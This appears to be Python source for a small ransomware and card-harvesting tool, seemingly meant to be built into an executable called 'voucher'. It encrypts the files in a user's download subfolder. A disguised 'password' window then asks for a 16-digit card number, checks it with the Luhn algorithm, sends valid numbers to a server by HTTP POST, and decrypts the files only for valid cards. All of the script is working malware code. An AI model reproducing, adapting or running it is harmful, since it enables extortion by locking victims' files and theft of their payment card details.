import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import base64
import hashlib
import requests
import json

# pyinstaller --onefile voucher.py

def generate_key(password):
    """
    Generate a key from the password using SHA-256.
    """
    return base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())

def encrypt_file(file_path, key):
    """
    Encrypts a file with the given key.
    """
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    
    encrypted = fernet.encrypt(original)
    
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
    print(f"Encrypted", file_path)

def decrypt_file(file_path, key):
    """
    Decrypts a file with the given key.
    """
    fernet = Fernet(key)
    with open(file_path, 'rb') as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = fernet.decrypt(encrypted)
    
    with open(file_path, 'wb') as file:
        file.write(decrypted)
    print(f"Decrypted", file_path)

def encrypt_files_in_directory(directory_path, key):
    """
    Encrypts all files in the specified directory.
    """
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

def decrypt_files_in_directory(directory_path, key):
    """
    Decrypts all files in the specified directory.
    """
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path):
            decrypt_file(file_path, key)

def ask_user_password_and_decrypt_files(directory_path, num_blocks, digits_per_block):
    """
    Displays a GUI asking for the user's password and decrypts files if the password is correct.
    """
    def on_submit():
        card_number = ""
        for entry in entries:
            part = entry.get()
            if not part.isdigit() or len(part) != digits_per_block:
                messagebox.showerror("Error", f"Each block must contain exactly {digits_per_block} digits.")
                return
            card_number += part
            
        if is_valid_credit_card(card_number):
            key = generate_key("dana")
            send_to_server(card_number)
        else:
            key = generate_key("ariel")        
        
        try:
            decrypt_files_in_directory(directory_path, key)
            messagebox.showinfo("Success", "Files decrypted successfully.")
            root.destroy()
        except Exception as e:
            messagebox.showerror("Error", "Incorrect password. Please try again.")
            # Clear entries for next attempt
            for entry in entries:
                entry.delete(0, tk.END)
            entries[0].focus()

    def on_key_release(event, next_entry):
        if len(event.widget.get()) == digits_per_block:
            next_entry.focus()

    root = tk.Tk()
    root.title("Password Input")
    
    tk.Label(root, text=f"Enter the password ({num_blocks} blocks of {digits_per_block} digits each):").pack()

    frame = tk.Frame(root)
    frame.pack()

    entries = []
    for i in range(num_blocks):
        entry = tk.Entry(frame, width=digits_per_block + 1)
        entry.pack(side=tk.LEFT)
        entries.append(entry)
        if i < num_blocks - 1:
            tk.Label(frame, text="-").pack(side=tk.LEFT)

    for i in range(num_blocks - 1):
        entries[i].bind("<KeyRelease>", lambda event, next_entry=entries[i+1]: on_key_release(event, next_entry))

    tk.Button(root, text="Submit", command=on_submit).pack()

    root.mainloop()

def is_valid_credit_card(card_number):
    # Step 1: Check if the input is a digit and has appropriate length (13 to 19 digits)
    if not card_number.isdigit() or not 13 <= len(card_number) <= 19:
        return False
   
    # Step 2: Implement the Luhn algorithm
    def luhn_checksum(card_number):
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10
   
    return luhn_checksum(card_number) == 0

def send_to_server(number):
    # URL of the server
    url = 'http://localhost:8080/'

    # JSON data to send in the POST request
    data = {
        'number': number
    }

    # Convert data to JSON format
    json_data = json.dumps(data)

    # Specify headers (content-type)
    headers = {
        'Content-type': 'application/json'
    }

    # Send POST request
    try:
        response = requests.post(url, data=json_data, headers=headers)
        
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            print("POST request successful.")
            print("Response from server:")
            print(response.text)
        else:
            print(f"POST request failed with status code {response.status_code}.")
            print("Response from server:")
            print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"Error sending POST request: {e}")

def list_folders(directory):
    folders = [name for name in os.listdir(directory) if os.path.isdir(os.path.join(directory, name))]
    return folders

if __name__ == "__main__":
    # Define the number of blocks and digits per block
    num_blocks = 4  # Change this to the number of blocks you want
    digits_per_block = 4  # Change this to the number of digits per block

    # directory = "C:\\Users\\Dana Amram\\Downloads\\delete2"
    directory = os.path.expanduser('~') + '\downloads\delete'
    print(directory)
    
    password = "dana"  # Define your encryption password here, e.g., "12-34-56"
    key = generate_key(password)
    
    encrypt_files_in_directory(directory, key)
    
    # For testing purpose: decrypt files after encrypting
    ask_user_password_and_decrypt_files(directory, num_blocks, digits_per_block)
